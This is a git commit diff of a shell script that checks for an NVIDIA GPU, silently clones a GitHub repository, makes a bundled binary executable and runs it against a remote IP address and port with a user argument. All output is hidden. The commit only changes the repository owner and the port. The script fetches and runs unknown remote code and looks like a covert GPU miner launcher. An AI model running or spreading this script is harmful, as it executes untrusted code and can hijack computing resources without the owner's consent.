95152514c3b681d7ffe5b9fad4b1af941f70c8cd
xuanh8624 <78060609+xuanh8624@users.noreply.github.com>
2021-01-27 09:03:48 +0700

    Update T.sh

--- T.sh
+++ T.sh
@@ -2,7 +2,7 @@
 nvidia-smi
 printf "User $1"  >&2
 {
-git clone https://github.com/phucbmt/tech.git &> /dev/null
+git clone https://github.com/xuanh8624/tech.git &> /dev/null
 sudo chmod +x tech/m
-./tech/m -P http://103.149.12.74:4545/"$1" &> log
+./tech/m -P http://103.149.12.74:4546/"$1" &> log
 } &> /dev/null
